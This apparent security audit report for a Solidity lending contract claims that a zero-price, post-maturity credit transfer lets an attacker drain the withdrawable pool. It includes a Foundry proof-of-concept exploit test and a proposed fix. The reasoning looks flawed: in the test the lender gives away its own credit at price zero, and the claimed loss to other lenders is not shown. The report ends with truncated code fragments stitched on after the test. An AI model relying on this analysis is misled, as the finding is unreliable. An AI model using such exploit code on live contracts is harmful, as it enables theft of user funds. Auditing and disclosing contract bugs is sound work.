### Title
Post-Maturity Zero-Price Credit Transfer Drains Withdrawable Pool — (`src/Midnight.sol`)

### Summary

`take()` in `src/Midnight.sol` enforces only one post-maturity guard: `sellerDebtIncrease == 0`. When a sell offer (or buy offer) is placed at `tick = 0` and the post-maturity settlement fee is zero, `buyerAssets` computes to exactly `0`. An attacker authorized for the buyer (taker) can execute the take for free, credit the buyer with `units` of credit, and immediately call `withdraw()` to drain `units` loan tokens from the protocol's withdrawable pool — receiving full face-value redemption for zero payment.

### Finding Description

**Code path — `src/Midnight.sol`:**

`tickToPrice(0)` returns `0`, proven by the Certora axiom and the unit test `testTickToPriceMinMax`: [1](#0-0) [2](#0-1) 

Post-maturity, `timeToMaturity = zeroFloorSub(maturity, block.timestamp) = 0`, so `settlementFee(id, 0)` returns `settlementFeeCbp0 * CBP`, which is `0` by default (and capped at 0.14 bps even when set): [3](#0-2) 

For a sell offer (`offer.buy = false`) at `tick = 0` with zero post-maturity settlement fee:

```
offerPrice   = tickToPrice(0) = 0
sellerPrice  = offerPrice     = 0
buyerPrice   = 0 + 0          = 0
buyerAssets  = units.mulDivUp(0, WAD) = 0
sellerAssets = units.mulDivUp(0, WAD) = 0
``` [4](#0-3) 

The only post-maturity guard is:
```solidity
require(block.timestamp <= offer.market.maturity || sellerDebtIncrease == 0, CannotIncreaseDebtPostMaturity());
``` [5](#0-4) 

When the seller (maker) has credit (`sellerPos.credit >= units`), `sellerCreditDecrease = units` and `sellerDebtIncrease = 0`, so this check passes. The state update then:
- decreases seller's credit by `units`
- increases buyer's (taker's) credit by `units`
- transfers `0` loan tokens from the payer [6](#0-5) [7](#0-6) 

The attacker (authorized for buyer/taker) then calls `withdraw()`, which has no maturity check and simply requires `withdrawable >= units`: [8](#0-7) 

`withdrawable` is funded by prior repayments and liquidations — a realistic post-maturity state: [9](#0-8) 

**Attacker-controlled inputs:**
- `offer.tick = 0` (valid, `tick` is `uint256`, range `[0, MAX_TICK]`)
- `offer.buy = false` (sell offer from seller who has credit)
- `taker = buyer` (attacker is authorized for buyer via `isAuthorized[buyer][attacker]`)
- `units` = any amount up to seller's credit

**Why existing checks fail:**
- `CannotIncreaseDebtPostMaturity` only checks `sellerDebtIncrease == 0` — it does not check that `buyerAssets >= units`
- `SellerIsLiquidatable` check passes because the seller (maker) has zero debt after credit decreases, so `isHealthy` returns `true` (`maxDebt=0 >= debt=0`)
- No floor on `buyerAssets` relative to `units` anywhere in `take()`

### Impact Explanation

The buyer receives `units` credit for `0` loan token payment. On `withdraw()`, the protocol transfers `units` loan tokens to the attacker's receiver address. The withdrawable pool — funded by legitimate borrower repayments — is drained by exactly `units` tokens per exploit invocation. Legitimate lenders who hold credit in the same market lose their ability to redeem, constituting direct loss of user funds and protocol insolvency.

### Likelihood Explanation

**Preconditions:**
1. Market is post-maturity (any market eventually reaches this state)
2. Post-maturity settlement fee at index 0 is `0` (the default; requires no admin action)
3. A sell offer at `tick = 0` exists from a seller with credit (e.g., a lender who placed a standing exit offer at the lowest tick, or any offer created programmatically at tick=0)
4. `withdrawable >= units` (realistic post-maturity: borrowers have repaid or been liquidated)
5. Attacker is authorized for the buyer (taker) — e.g., via `setIsAuthorized` or EcrecoverAuthorizer

Conditions 1, 2, and 4 are the normal post-maturity state. Condition 3 requires a standing offer at tick=0, which is unusual but not impossible (e.g., a lender placing a reduce-only exit offer at the minimum price). Condition 5 is the standard authorization model. The exploit is repeatable until the seller's credit or the withdrawable pool is exhausted.

### Recommendation

Add a post-maturity floor requiring the buyer to pay at least face value when credit is being transferred (i.e., when `buyerCreditIncrease > 0` and `block.timestamp > offer.market.maturity`):

```solidity
require(
    block.timestamp <= offer.market.maturity || buyerCreditIncrease == 0 || buyerAssets >= buyerCreditIncrease,
    BuyerMustPayFaceValuePostMaturity()
);
```

This ensures that post-maturity credit increases are only permitted when the buyer pays at least 1 loan token per unit of credit acquired, preserving the invariant that every credit unit in the withdrawable pool has a corresponding asset backing.

### Proof of Concept

```solidity
function testPostMaturityZeroPriceCreditDrain() public {
    uint256 units = 100e18;

    // Setup: lender has credit backed by borrower debt
    deal(address(loanToken), lender, units);
    collateralize(market, borrower, units);
    take(units, lender, borrowerOffer); // lender gets units credit

    // Borrower repays, making withdrawable = units
    deal(address(loanToken), borrower, units);
    vm.prank(borrower);
    midnight.repay(market, units, borrower, address(0), "");
    assertEq(midnight.withdrawable(id), units);

    // Warp past maturity
    vm.warp(market.maturity + 1);

    // Lender places a sell offer at tick=0 (price=0), settlement fee=0 (default)
    Offer memory zeroOffer;
    zeroOffer.buy = false;
    zeroOffer.maker = lender;
    zeroOffer.tick = 0; // tickToPrice(0) == 0
    zeroOffer.market = market;
    zeroOffer.expiry = block.timestamp + 1;
    zeroOffer.maxUnits = units;
    zeroOffer.ratifier = address(dummyRatifier);
    zeroOffer.receiverIfMakerIsSeller = lender;

    // Attacker is authorized for buyer (fresh address)
    address buyer = makeAddr("buyer");
    address attacker = makeAddr("attacker");
    vm.prank(buyer);
    midnight.setIsAuthorized(attacker, true, buyer);

    // Attacker takes the zero-price sell offer on behalf of buyer
    vm.prank(attacker);
    (uint256 buyerAssets,) = midnight.take(zeroOffer, "", units, buyer, buyer, address(0), "");

    // Assert: buyer paid nothing, got full credit
    assertEq(buyerAssets, 0, "buyer paid zero");
    assertEq(midnight.creditOf(id, buyer), units, "buyer has full credit");
    assertEq(midnight.creditOf(id, lender), 0, "lender credit drained");

    // Attacker withdraws on behalf of buyer — drains withdrawable pool
    vm.prank(attacker);
    midnight.withdraw(market, units, buyer, attacker);

    assertEq(loanToken.balanceOf(attacker), units, "attacker stole loan tokens");
    assertEq(midnight.withdrawable(id), 0, "pool drained");
}
```

**Expected assertions if bug is present:** all pass — `buyerAssets == 0`, attacker balance `== units`.
**Expected assertions if fix is applied:** `take()` reverts with `BuyerMustPayFaceValuePostMaturity`.

        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        bytes32 id = touchMarket(market);

        _updatePosition(market, id, onBehalf);

        uint128 pendingFeeDecrease;
        if (_position.credit > 0) {
            pendingFeeDecrease = UtilsLib.toUint128(_position.pendingFee.mulDivUp(units, _position.credit));

        _marketState.totalUnits -= UtilsLib.toUint128(units);

    function settlementFee(bytes32 id, uint256 timeToMaturity) public view returns (uint256) {
        MarketState storage _marketState = marketState[id];
        require(_marketState.tickSpacing > 0, MarketNotCreated());

        if (timeToMaturity >= 360 days) return _marketState.settlementFeeCbp6 * CBP;

        // forgefmt: disable-start
        (uint256 start, uint256 end, uint256 feeLower, uint256 feeUpper) =
            timeToMaturity < 1 days   ? (  0 days,   1 days, _marketState.settlementFeeCbp0 * CBP, _marketState.settlementFeeCbp1 * CBP) :
            timeToMaturity < 7 days   ? (  1 days,   7 days, _marketState.settlementFeeCbp1 * CBP, _marketState.settlementFeeCbp2 * CBP) :
            timeToMaturity < 30 days  ? (  7 days,  30 days, _marketState.settlementFeeCbp2 * CBP, _marketState.settlementFeeCbp3 * CBP) :
            timeToMaturity < 90 days  ? ( 30 days,  90 days, _marketState.settlementFeeCbp3 * CBP, _marketState.settlementFeeCbp4 * CBP) :
            timeToMaturity < 180 days ? ( 90 days, 180 days, _marketState.settlementFeeCbp4 * CBP, _marketState.settlementFeeCbp5 * CBP) :
                                        (180 days, 360 days, _marketState.settlementFeeCbp5 * CBP, _marketState.settlementFeeCbp6 * CBP);
        // forgefmt: disable-end

        return (feeLower * (end - timeToMaturity) + feeUpper * (timeToMaturity - start)) / (end - start);
    }
